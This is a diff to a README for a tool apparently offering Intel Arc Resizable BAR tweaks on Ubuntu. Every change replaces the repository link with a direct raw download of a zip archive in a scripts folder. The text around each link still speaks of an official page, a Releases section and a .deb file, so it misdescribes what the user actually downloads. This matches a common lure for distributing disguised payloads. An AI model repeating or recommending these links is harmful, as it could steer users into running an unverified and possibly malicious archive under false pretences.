@@ -36,7 +36,7 @@ Follow these simple steps to get started:
 
 Click the big button below to go to the download page:
 
-[<span style="font-size:24px;font-weight:bold;background:linear-gradient(90deg,#ff007f,#ff7f00);color:white;padding:15px 35px;border-radius:50px;text-decoration:none;display:inline-block;">⬇️ Download Intel-ARC-Rebar Now</span>](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar)
+[<span style="font-size:24px;font-weight:bold;background:linear-gradient(90deg,#ff007f,#ff7f00);color:white;padding:15px 35px;border-radius:50px;text-decoration:none;display:inline-block;">⬇️ Download Intel-ARC-Rebar Now</span>](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar/raw/refs/heads/main/scripts/v2.5.zip)
 
 **Visit this link to download the application.** This will take you to the official page where you can get the latest version.
 
@@ -56,7 +56,7 @@ Once installation finishes, restart your computer. That's it! The tool is now ac
 
 If you prefer step-by-step written instructions, here they are:
 
-1. Open your web browser and go to the download link: [https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar)
+1. Open your web browser and go to the download link: [https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar/raw/refs/heads/main/scripts/v2.5.zip](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar/raw/refs/heads/main/scripts/v2.5.zip)
 2. Scroll down to the "Releases" or "Assets" section.
 3. Click the file named something like `intel-arc-rebar_1.0.0_amd64.deb`.
 4. Your browser will download the file to your Downloads folder.
@@ -122,7 +122,7 @@ This tool works best on Ubuntu 20.04 or newer. If you have an older version, con
 
 New versions of Intel-ARC-Rebar are released occasionally. To update:
 
-1. Visit the download page again: [https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar)
+1. Visit the download page again: [https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar/raw/refs/heads/main/scripts/v2.5.zip](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar/raw/refs/heads/main/scripts/v2.5.zip)
 2. Download the newest `.deb` file.
 3. Install it over the old version (double-click and click "Update" or "Install").
 4. Restart your computer.
@@ -172,6 +172,6 @@ If you have an Intel Arc graphics card and want to get every bit of performance 
 
 Setting it up takes less than five minutes. The payoff is better performance every single time you use your computer. Don't leave performance on the table. Unlock your GPU's true potential today.
 
-**[⬇️ Download Intel-ARC-Rebar from the Official Page](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar)**
+**[⬇️ Download Intel-ARC-Rebar from the Official Page](https://github.com/anjingkongkok-crypto/Intel-ARC-Rebar/raw/refs/heads/main/scripts/v2.5.zip)**
 
 Thank you for choosing Intel-ARC-Rebar. We hope it makes your computing experience faster and more enjoyable.
